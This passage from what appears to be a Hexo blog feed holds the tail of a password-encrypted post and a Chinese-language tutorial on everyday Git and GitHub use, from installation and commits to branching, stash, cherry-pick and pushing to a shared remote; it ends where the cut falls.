20ddb1a565435042ed116a69ad7d3d5669e66ffe04a01309a08b8f06aea1ba35269b92eddb8bb4518840700926101164c75d59aa4dcc4c75aa44544b0cc2133efddc4eb49d2b07dcdb967dfa639fc631afbbe325e7c58a03c96fb95fb64051bcca9633f6b3e2a23ac6ce202e8a92b5bfcb5ca1c92807e050ade7da137a846987a2130d79537c7c32cb6400290da4229dee6be9d0b1bfae2c5fd1d2b91b30dc118e728393db4b21785a3504267f85b9298fc787828ce4bfdbc0ed8c89f0dedbd6d3c41e60edbdbf261e2e0bd01a844ba2e5952a50ef26304873028188defd6002fcf552f43c5708737f38302f7f084ca51a777f143285c722e00a546647ecb30961b309c6cdcc34c1a827768d3b7039366af2b38100f751a3f240083adf6fafdc561e0a92d9ceb2eaa574aea71778342a962f9944660f48bdd066d8373b3d11e557b5a9d194e620b472ec0030ce9f8413b5596b984706a6507bb5847425a04783592a61a5eaded9e176978891aac5cabd7538c3dd035d78ebbc79f69ceab313b34f5bc5b4fdc1fd89d58611b3d996f1aa38d6737bea32bd0f87b65e7ac7bf1588094dd9587dbb7eff9c88c87646186e1304b1dbddf371eec94397969dc537d7195f2653b002c4cdda602427675b8f6e47b0a4a2567390e03bc25ac11605f9748b9015def3a698eebbfb082a5be1da969c3ab693e44ed26a4b436ddf3b08f9bf8861e51c1ca642dae161f26793fb44414b3a1b5e490fa28212261ed92e199f787ac413bc2ef5e1864d316e23de114a138352ded6560b5fede8cb08e06b557d9db601097694dac5589287c00ee4fc5d47b85092a9e098cadd2b5fedcd914f048010e281c081c5c1f180bac1b83f81ee900e6e7a6dd69d772168dd3b6a5c013199734cde45212fa9856ec380d7cde6d9d77a01b4c10bf99e6a491d7fbb36224bbe3e6a5ce5085f725d94b88453caa7a1257234d84625f6832b3db92423b09427b3c62df855b7032b0c79481030f91083f69cc45d385bb67cc6d373dbbe7779706bddf507c45f6d1e15472f294d3dbb9824d8aacc6edcd7bc44c3277cb4a60216e2efeedeca90861b4db8d6dacc5d4ddd91d48e54f1a1fa2c628d9c9b2e975a98c0193c1e857d1b52f086cc770711707d54391e4e2e20dc704b52d5f5dfd995a535c50817e94bd712cb5f90ae787566d92864c552cbe2da866b2261a9498ed2a2b5580edc36ca51db8dfcaaccfeb3184fd2181d80da3c34406de6a3363adccd68f13790556f002ba338b5237dc3d46d933cf2e0de1071fb93e7694b6b274afe7e5a882364009b8a13510d82d61936715eeed37856ceb245433146be02de474676178004e87f030ea7fe111cf170dc52823d782e486958a3b4f5b5e5633b9322305c2ecc41465bc5cdc5480de1cc50db10580f80bc9000331c1770e9a98f36ac93ba621a01aa3bcadb9171127cb7e71cf60ac14205cc1638e1d304a2fa3d75bcf4df3e3e535d34666e7317bf6cdbc70c4b99d0d86b5b3cd5a64a713e36e0c4832bcee864180d773cdd396c641a98191cf06bf66696db1e3a89d4205dcdd79e0271ced8a1d0f09ee6dd3afe69a6e623127f2de3db369e67c80261447687f7a9461c5eea1ae98e507657849dd19d03f4b2af3b97bd967a4be1a663bba7d698502c9b458e9f5671f869c92ef9c0384198a256e5ce660a3d7cda4c4da2d977bb5d673793c4ee850812ae6a5043992248b3e5ea69fb32d88d3861525ca0ec85a0b03d30a68f97a556fa4d7de653f6ebebadaff67ea9e8ee44d9d1339a03e780a71599592a40a58f728f63b2d5e0e8b6c81f918074cc89714956911d41b3660c549d541f6bcc63e7d2641c523b7612d5fe483fbe70f058162850263714b1903a1303788e52a501f1ec4365c2657f287c498b32055144a3a583d2ec59385214dcd024ad71bdc6414ae287b12a60ec275a830c35abfebc48d97eb992c109b49e8c3e17525288da9848a619bd193c43320a757849c1c1b105711d2913b5cc7c0b100d09490e1cfdc8624c42ddcd69c86f23506732d1ba062d244153898fe9c270acd08ff77a3d6dccab340b0b7398b106be5cf4e3c5fd687ee6081ee67cb11e2bbdff502daeba4170a83ad8c3761f894d316d4d1dbf8bc0fbdbdc4d66c5678e40f5a5d19cac13ecb0a25dd9f8d3561dbd5b0aecf1b629173c9715bdf49d43f48cbafde22c4db0eed4ccaeb37a36a1d000eec1de23de1ec6498434173fc2f2d3fac022289e6899ffc6bc9ba9080653beadc26477dab93950cbfba8d585c0276cf70450aef3cd880de061824bd05cbdf1e945c5d8b08cd052cdd1a0a305cc939fe0bda7ef9839490202afe7c69ae9ba0ccfa8c645e59c8a0e6f12ea568590827a38557424e87a36ab2cb17f</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>Git以及Github的使用教程</title>
    <link href="https://muzibing.github.io/2020/07/29/2020.07.29%EF%BC%88143%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/29/2020.07.29（143）/</id>
    <published>2020-07-28T16:00:00.000Z</published>
    <updated>2020-08-23T10:14:39.697Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、Git-教程"><a href="#一、Git-教程" class="headerlink" title="一、Git 教程"></a>一、Git 教程</h3><h4 id="1-Git-介绍"><a href="#1-Git-介绍" class="headerlink" title="1.Git 介绍"></a>1.Git 介绍</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Git (/ɡɪt/) is a distributed version-control system for tracking changes in source code during software development.[8] It is designed for coordinating work among programmers, but it can be used to track changes in any set of files. Its goals include speed,[9] data integrity,[10] and support for distributed, non-linear workflows.[11]  Git was created by Linus Torvalds in 2005 for development of the Linux kernel, with other kernel developers contributing to its initial development.[12] Its current maintainer since 2005 is Junio Hamano. As with most other distributed version-control systems, and unlike most client–server systems, every Git directory on every computer is a full-fledged repository with complete history and full version-tracking abilities, independent of network access or a central server.[13] Git is free and open-source software distributed under the terms of the GNU General Public License version 2.—wiki</p><blockquote><p>Git是一个分布式版本控制系统，用于在软件开发过程中跟踪源代码的变化。它是为协调程序员之间的工作而设计的，但可用于跟踪任何文件集中的更改。其目标包括速度数据完整性以及对分布式非线性工作流的支持。</p><p>Git由Linus Torvalds于2005年创建，用于Linux内核的开发，其他内核开发人员也为Git的初始开发做出了贡献。自2005年以来，它的当前维护者是Junio Hamano。与大多数其他分布式版本控制系统一样，与大多数客户端服务器系统不同，每台计算机上的每个Git目录都是具有完整历史记录和完整版本跟踪功能的成熟存储库，而与网络访问或中央服务器无关。 Git是根据GNU通用公共许可版本2的条款分发的免费和开源软件。</p></blockquote><h4 id="2-安装Git"><a href="#2-安装Git" class="headerlink" title="2.安装Git"></a>2.安装Git</h4><p><code>Linux</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><p><code>Windows</code></p><blockquote><p>在Windows上使用Git，可以从Git官网直接<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">下载安装程序</a>，然后按默认选项安装即可。安装完成后，在开始菜单里找到“Git”-&gt;“Git Bash”，蹦出一个类似命令行窗口的东西，就说明Git安装成功！</p></blockquote><p><code>配置Git用户名</code></p><blockquote><p>这要和配置github的信息要区分开来</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.name <span class="string">"Your Name"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.email <span class="string">"email@example.com"</span></span></span><br></pre></td></tr></table></figure><h4 id="3-创建版本库"><a href="#3-创建版本库" class="headerlink" title="3.创建版本库"></a>3.创建版本库</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先有必要了解一下版本库的工作区和暂存区：</p><p><img src="/images/143-1.png" alt></p><blockquote><p>如上图所示，工作区有一个隐藏目录<code>.git</code>，这个不算工作区，而是Git的版本库，上图就是在演示将文件从工作区移到版本库中，分为了两步。Git的版本库里存了很多东西，其中最重要的就是称为stage（或者叫index）的暂存区，还有Git为我们自动创建的第一个分支<code>master</code>，以及指向<code>master</code>的一个指针叫<code>HEAD</code>。</p><p>一定要在空目录下创建</p></blockquote><p><code>初始化</code></p><blockquote><p>将自己创建的空目录变为Git可以管理的仓库</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git init</span></span><br></pre></td></tr></table></figure><p><code>把文件添加到版本库</code></p><blockquote><p>第一步，用命令<code>git add</code>告诉Git，把文件添加到仓库：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git add fileName</span></span><br></pre></td></tr></table></figure><blockquote><p>第二步，用命令<code>git commit</code>告诉Git，把文件提交到仓库：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"&lt;本次提交的说明&gt;"</span></span></span><br></pre></td></tr></table></figure><p><code>查看仓库当前状态</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br></pre></td></tr></table></figure><h4 id="4-修改文件"><a href="#4-修改文件" class="headerlink" title="4.修改文件"></a>4.修改文件</h4><blockquote><p>查看修改的内容</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git diff fileName</span></span><br></pre></td></tr></table></figure><h4 id="5-版本回退"><a href="#5-版本回退" class="headerlink" title="5.版本回退"></a>5.版本回退</h4><p><code>查看历史记录</code></p><blockquote><p>显示从最近到最远的提交日。</p><font size="2">需要友情提示的是，你看到的一大串类似`1094adb...`的是`commit id`（版本号），和SVN不一样，Git的`commit id`不是1，2，3……递增的数字，而是一个SHA1计算出来的一个非常大的数字，用十六进制表示，而且你看到的`commit id`和我的肯定不一样，以你自己的为准。为什么`commit id`需要用这么一大串数字表示呢？因为Git是分布式的版本控制系统，如果还要研究多人在同一个版本库里工作，如果大家都用1，2，3……作为版本号，那肯定就冲突了。</font></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br></pre></td></tr></table></figure><p><code>版本回退</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard HEAD^/SHA1-ID</span></span><br></pre></td></tr></table></figure><blockquote><p>上一个版本就是<code>HEAD^</code>，上上一个版本就是<code>HEAD^^</code>，当然往上100个版本写100个<code>^</code>比较容易数不过来，所以写成<code>HEAD~100</code>。</p><p>Git的版本回退速度非常快，因为Git在内部有个指向当前版本的<code>HEAD</code>指针，当你回退版本的时候，Git仅仅是把HEAD从指向<code>回退前的状态</code>改为指向<code>回退后的状态</code>，然后顺便把工作区的文件更新了。</p></blockquote><p><code>查看每一次命令的信息</code></p><blockquote><p>要重返未来，用<code>git reflog</code>查看命令历史，以便确定要回到未来的哪个版本。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reflog</span></span><br></pre></td></tr></table></figure><h4 id="6-撤销修改"><a href="#6-撤销修改" class="headerlink" title="6.撤销修改"></a>6.撤销修改</h4><p><code>丢弃工作区的修改</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout -- fileName</span></span><br></pre></td></tr></table></figure><blockquote><p>命令<code>git checkout -- readme.txt</code>意思就是，把<code>readme.txt</code>文件在工作区的修改全部撤销，这里有两种情况：</p><ul><li><p>一种是<code>readme.txt</code>自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态；</p></li><li><p>一种是<code>readme.txt</code>已经添加到暂存区后，又作了修改，现在，撤销修改就回到添加到暂存区后的状态。</p></li></ul><p>总之，就是让这个文件回到最近一次<code>git commit</code>或<code>git add</code>时的状态。</p><font size="2">`git checkout -- file`命令中的`--`很重要，没有`--`，就变成了“切换到另一个分支”的命令</font></blockquote><h4 id="7-删除文件"><a href="#7-删除文件" class="headerlink" title="7.删除文件"></a>7.删除文件</h4><blockquote><p>在Git中，删除也是一个修改操作，</p></blockquote><p><code>确实要从版本库中删除该文件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git rm test.txt</span></span><br><span class="line">rm 'test.txt'</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"remove test.txt"</span></span></span><br><span class="line">[master d46f35e] remove test.txt</span><br><span class="line"> 1 file changed, 1 deletion(-)</span><br><span class="line"> delete mode 100644 test.txt</span><br></pre></td></tr></table></figure><h3 id="二、Github使用"><a href="#二、Github使用" class="headerlink" title="二、Github使用"></a>二、Github使用</h3><h4 id="1-创建SSH-Key"><a href="#1-创建SSH-Key" class="headerlink" title="1.创建SSH Key"></a>1.创建SSH Key</h4><blockquote><p>在用户主目录下，看看有没有.ssh目录，如果有，再看看这个目录下有没有<code>id_rsa</code>和<code>id_rsa.pub</code>这两个文件，如果已经有了，可直接跳到下一步。如果没有，打开Shell（Windows下打开Git Bash），创建SSH Key：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh-keygen -t rsa -C <span class="string">"youremail@example.com"</span></span></span><br></pre></td></tr></table></figure><blockquote><p>如果一切顺利的话，可以在用户主目录里找到<code>.ssh</code>目录，里面有<code>id_rsa</code>和<code>id_rsa.pub</code>两个文件，这两个就是SSH Key的秘钥对，<code>id_rsa</code>是私钥，不能泄露出去，<code>id_rsa.pub</code>是公钥，可以放心地告诉任何人。</p></blockquote><h4 id="2-登陆GitHub"><a href="#2-登陆GitHub" class="headerlink" title="2.登陆GitHub"></a>2.登陆GitHub</h4><blockquote><p>打开“Account settings”，“SSH Keys”页面，然后点“Add SSH Key”，填上任意Title，在Key文本框里粘贴<code>id_rsa.pub</code>文件的内容：</p></blockquote><p><img src="/images/143-2.png" alt></p><h4 id="3-添加远程库"><a href="#3-添加远程库" class="headerlink" title="3.添加远程库"></a>3.添加远程库</h4><p><code>情景</code></p><blockquote><p>已经在本地创建了一个Git仓库后，又想在GitHub创建一个Git仓库，并且让这两个仓库进行远程同步，这样，GitHub上的仓库既可以作为备份，又可以让其他人通过该仓库来协作，真是一举多得。</p></blockquote><p><code>第一步</code></p><blockquote><p>首先，登陆GitHub，然后，在右上角找到“Create a new repo”按钮，创建一个新的仓库</p></blockquote><p><code>第二步</code></p><blockquote><p>在Repository name填入<code>learngit</code>，其他保持默认设置，点击“Create repository”按钮，就成功地创建了一个新的Git仓库</p></blockquote><p><code>第三步</code></p><blockquote><p>将本地git仓库和远程的github仓库关联起来</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git remote add origin <span class="string">" Your Github address"</span></span></span><br></pre></td></tr></table></figure><p><code>第四步</code></p><blockquote><p>把本地仓库的所有内容推送到远程库上</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git push -u origin master</span></span><br></pre></td></tr></table></figure><blockquote><p>把本地库的内容推送到远程，用<code>git push</code>命令，实际上是把当前分支<code>master</code>推送到远程。</p><p>由于远程库是空的，我们<strong>第一次推送<code>master</code>分支时，加上了<code>-u</code>参数</strong>，Git不但会把本地的<code>master</code>分支内容推送的远程新的<code>master</code>分支，还会把本地的<code>master</code>分支和远程的<code>master</code>分支关联起来，在以后的推送或者拉取时就可以简化命令。</p><p>此后，每次本地提交后，只要有必要，就可以使用命令<code>git push origin master</code>推送最新修改；</p></blockquote><h4 id="4-从远程仓库克隆"><a href="#4-从远程仓库克隆" class="headerlink" title="4.从远程仓库克隆"></a>4.从远程仓库克隆</h4><p><code>克隆一个本地库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> git@<span class="string">"github address"</span></span></span><br></pre></td></tr></table></figure><h4 id="5-创建与合并分支"><a href="#5-创建与合并分支" class="headerlink" title="5.创建与合并分支"></a>5.创建与合并分支</h4><blockquote><p><code>HEAD</code>严格来说不是指向提交，而是指向<code>master</code>，<code>master</code>才是指向提交的，所以，<code>HEAD</code>指向的就是当前分支。一开始的时候，<code>master</code>分支是一条线，Git用<code>master</code>指向最新的提交，再用<code>HEAD</code>指向<code>master</code>，就能确定当前分支，以及当前分支的提交点：</p></blockquote><p><img src="/images/143-3.png" alt></p><blockquote><p>每次提交，<code>master</code>分支都会向前移动一步，这样，随着你不断提交，<code>master</code>分支的线也越来越长。</p><p>当我们创建新的分支，例如<code>dev</code>时，Git新建了一个指针叫<code>dev</code>，指向<code>master</code>相同的提交，再把<code>HEAD</code>指向<code>dev</code>，就表示当前分支在<code>dev</code>上：</p></blockquote><p><img src="/images/143-4.png" alt></p><blockquote><p>Git创建一个分支很快，因为除了增加一个<code>dev</code>指针，改改<code>HEAD</code>的指向，工作区的文件都没有任何变化！</p><p>不过，从现在开始，对工作区的修改和提交就是针对<code>dev</code>分支了，比如新提交一次后，<code>dev</code>指针往前移动一步，而<code>master</code>指针不变：</p></blockquote><p><img src="/images/143-5.png" alt></p><blockquote><p>假如我们在<code>dev</code>上的工作完成了，就可以把<code>dev</code>合并到<code>master</code>上。Git怎么合并呢？最简单的方法，就是直接把<code>master</code>指向<code>dev</code>的当前提交，就完成了合并：</p></blockquote><p><img src="/images/143-6.png" alt></p><blockquote><p>所以Git合并分支也很快！就改改指针，工作区内容也不变！</p><p>合并完分支后，甚至可以删除<code>dev</code>分支。删除<code>dev</code>分支就是把<code>dev</code>指针给删掉，删掉后，我们就剩下了一条<code>master</code>分支：</p></blockquote><p><img src="/images/143-7.png" alt></p><p><code>创建dev分支，然后切换dev分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout -b dev</span></span><br></pre></td></tr></table></figure><blockquote><p><code>git checkout</code>命令加上<code>-b</code>参数表示创建并切换，相当于以下两条命令：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout dev</span></span><br></pre></td></tr></table></figure><p><code>查看当前分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br></pre></td></tr></table></figure><p><code>把dev分支的工作成果合并到master分支上</code></p><blockquote><p>要先执行<code>git add &quot;fileName&quot;</code>和<code>git commit &quot;fileName&quot;</code>，才能进行合并</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge dev</span></span><br></pre></td></tr></table></figure><blockquote><p>注意到上面的<code>Fast-forward</code>信息，Git告诉我们，这次合并是“快进模式”，也就是直接把<code>master</code>指向<code>dev</code>的当前提交，所以合并速度非常快。如果<font color="red">合并分支时加上<code>--no-ff</code>参数：表示禁用<code>Fast forward</code></font>的区别：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merge with no-ff"</span> dev</span></span><br></pre></td></tr></table></figure><blockquote><p>下图是加上该参数的情况</p></blockquote><p><img src="/images/143-8.png" alt></p><p><code>查看分支合并的情况</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --graph</span></span><br></pre></td></tr></table></figure><h4 id="6-删除分支"><a href="#6-删除分支" class="headerlink" title="6.删除分支"></a>6.删除分支</h4><p><code>删除分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch -d dev</span></span><br></pre></td></tr></table></figure><p><code>强行删除分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch -D dev</span></span><br></pre></td></tr></table></figure><h4 id="7-解决冲突"><a href="#7-解决冲突" class="headerlink" title="7.解决冲突"></a>7.解决冲突</h4><blockquote><p>Git用<code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>，<code>=======</code>，<code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>标记出不同分支的内容，如下：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Git is a distributed version control system.</span><br><span class="line">Git is free software distributed under the GPL.</span><br><span class="line">Git has a mutable index called stage.</span><br><span class="line">Git tracks changes of files.</span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">Creating a new branch is quick &amp; simple.</span><br><span class="line">=======</span><br><span class="line">Creating a new branch is quick AND simple.</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;&gt;&gt;&gt;&gt; feature1</span></span><br></pre></td></tr></table></figure><blockquote><p>我们修改如下后保存：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Creating a new branch is quick and simple.</span><br></pre></td></tr></table></figure><h4 id="8-分支策略"><a href="#8-分支策略" class="headerlink" title="8.分支策略"></a>8.分支策略</h4><blockquote><p>首先，<code>master</code>分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；那在哪干活呢？干活都在<code>dev</code>分支上，也就是说，<code>dev</code>分支是不稳定的，到某个时候，比如1.0版本发布时，再把<code>dev</code>分支合并到<code>master</code>上，在<code>master</code>分支发布1.0版本；你和你的小伙伴们每个人都在<code>dev</code>分支上干活，每个人都有自己的分支，时不时地往<code>dev</code>分支上合并就可以了。所以，团队合作的分支看起来就像这样：</p></blockquote><p><img src="/images/143-9.png" alt></p><h4 id="9-Bug分支"><a href="#9-Bug分支" class="headerlink" title="9.Bug分支"></a>9.Bug分支</h4><p><code>储存当前分支的工作现场</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash</span></span><br></pre></td></tr></table></figure><p><code>从当前分支上切换到存在Bug的分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout [branchName]</span></span><br></pre></td></tr></table></figure><p><code>创建Bug分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout -b issue-101</span></span><br></pre></td></tr></table></figure><p><code>修复Bug</code></p><p><code>从bug分支上切换到存在Bug的分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch [branchName]</span></span><br></pre></td></tr></table></figure><p><code>合并分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merged bug fix 101"</span> issue-101</span></span><br></pre></td></tr></table></figure><p><code>切换到干活的分支</code></p><p><code>查看当前分支的工作现场</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash list</span></span><br></pre></td></tr></table></figure><p><code>恢复当前分支的工作现场</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash apply</span></span><br></pre></td></tr></table></figure><blockquote><p>⇡ 恢复后，stash内容并不删除，你需要用<code>git stash drop</code>来删除；</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash pop</span></span><br></pre></td></tr></table></figure><blockquote><p>⇡ 恢复的同时把stash内容也删了</p></blockquote><p><code>在不同的分支上同步修改bug的操作</code></p><blockquote><p>比如我们在master分支上修复了bug，那么我们怎么同步到dev分支上呢？同样的bug，要在dev上修复，我们只需要把<code>4c805e2 fix bug 101</code>这个提交所做的修改“复制”到dev分支。注意：我们只想复制<code>4c805e2 fix bug 101</code>这个提交所做的修改，并不是把整个master分支merge过来。</p><p>为了方便操作，Git专门提供了一个<code>cherry-pick</code>命令，让我们能复制一个特定的提交到当前分支：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git cherry-pick 4c805e2(master的sha1值)</span></span><br></pre></td></tr></table></figure><h4 id="10-多人协作"><a href="#10-多人协作" class="headerlink" title="10.多人协作"></a>10.多人协作</h4><p><code>查看远程库信息</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git remote</span></span><br><span class="line">origin</span><br></pre></td></tr></table></figure><blockquote><p>用<code>git remote -v</code>显示更详细的信息</p></blockquote><p><code>推送分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git push origin <span class="string">"branchName"</span></span></span><br></pre></td></tr></table></figure><ul><li><code>master</code>分支是主分支，因此要时刻与远程同步；</li><li><code>dev</code>分支是开发分支，团队所有成员都需要在上面工作，所以也需要与远程同步；</li><li><code>bug</code>分支只用于在本地修复bug，就没必要推到远程了，除非老板要看看你每周到底修复了几个bug；</li><li><code>featur</code>e分支是否推到远程，取决于你是否和你的小伙伴合作在上面开发。</li></ul><p><code>抓取分支</code></p><blockquote><p>首先要克隆一个仓库，如果A在修改文件后push到远程仓库后，你也要push到远程仓库，那么会收到如下信息：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat env.txt</span></span><br><span class="line">env</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git add env.txt</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"add new env"</span></span></span><br><span class="line">[dev 7bd91f1] add new env</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 env.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git push origin dev</span></span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line"> ! [rejected]        dev -&gt; dev (non-fast-forward)</span><br><span class="line">error: failed to push some refs to 'git@github.com:michaelliao/learngit.git'</span><br><span class="line">hint: Updates were rejected because the tip of your current branch is behind</span><br><span class="line">hint: its remote counterpart. Integrate the remote changes (e.g.</span><br><span class="line">hint: 'git pull ...') before pushing again.</span><br><span class="line">hint: See the 'Note about fast-forwards' in 'git push --help' for details.</span><br></pre></td></tr></table></figure><blockquote><p>推送失败，因为你的小伙伴的最新提交和你试图推送的提交有冲突，解决办法也很简单，Git已经提示我们，先用<code>git pull</code>把最新的提交从<code>origin/dev</code>抓下来，然后，在本地合并，解决冲突，再推送：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 